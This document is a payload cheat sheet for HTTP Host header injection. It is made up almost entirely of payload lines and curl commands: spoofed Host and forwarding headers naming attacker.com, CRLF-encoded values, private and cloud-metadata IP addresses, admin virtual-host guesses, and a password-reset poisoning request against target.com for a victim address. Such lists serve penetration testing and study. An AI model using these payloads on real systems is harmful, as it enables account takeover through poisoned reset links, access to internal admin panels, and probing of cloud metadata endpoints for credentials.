# Host Header Payloads

## Basic Host Tests

```
Host: attacker.com
Host: localhost
Host: 127.0.0.1
Host: internal
Host: admin
```

---

## Override Headers

```
X-Forwarded-Host: attacker.com
X-Host: attacker.com
Forwarded: host=attacker.com
X-Original-Host: attacker.com
X-Rewrite-URL: attacker.com
X-Forwarded-Server: attacker.com
X-HTTP-Host: attacker.com
```

---

## Virtual Host Names

```
admin.target.com
dev.target.com
staging.target.com
internal.target.com
api.target.com
beta.target.com
test.target.com
prod.target.com
backup.target.com
old.target.com
v2.target.com
v3.target.com
```

---

## Port Variations

```
Host: attacker.com:80
Host: attacker.com:443
Host: attacker.com:8080
Host: target.com:attacker.com
Host: target.com@attacker.com
```

---

## Encoding Attempts

```
Host: attacker.com%20
Host: attacker.com\x0d\x0a
Host: attacker.com%0d%0a
Host: attacker.com;
Host: attacker.com/
```

---

## Private IPs

```
Host: 192.168.1.1
Host: 192.168.0.1
Host: 10.0.0.1
Host: 172.16.0.1
Host: 169.254.169.254
```

---

## Cloud Metadata

```
Host: metadata
Host: cloud
Host: aws
Host: gcp
Host: azure
Host: 169.254.169.254
```

---

## Common Admin Variants

```
Host: admin
Host: admin.local
Host: admin.internal
Host: superadmin
Host: administrator
Host: admin-panel
Host: cms
Host: dashboard
```

---

## curl Examples

### Basic Test
```bash
curl -H "Host: attacker.com" https://target.com/
```

### X-Forwarded-Host
```bash
curl -H "X-Forwarded-Host: attacker.com" https://target.com/
```

### Multiple Headers
```bash
curl -H "Host: target.com" \
     -H "X-Forwarded-Host: attacker.com" \
     https://target.com/
```

### Password Reset
```bash
curl -X POST \
     -H "Host: attacker.com" \
     -d "email=victim@example.com" \
     https://target.com/forgot-password
```

### Keep-Alive Connection
```bash
curl -H "Host: target.com" \
     -H "Connection: keep-alive" \
     https://target.com/ && \
curl -H "Host: attacker.com" \
     -H "Connection: keep-alive" \
     https://target.com/admin
```

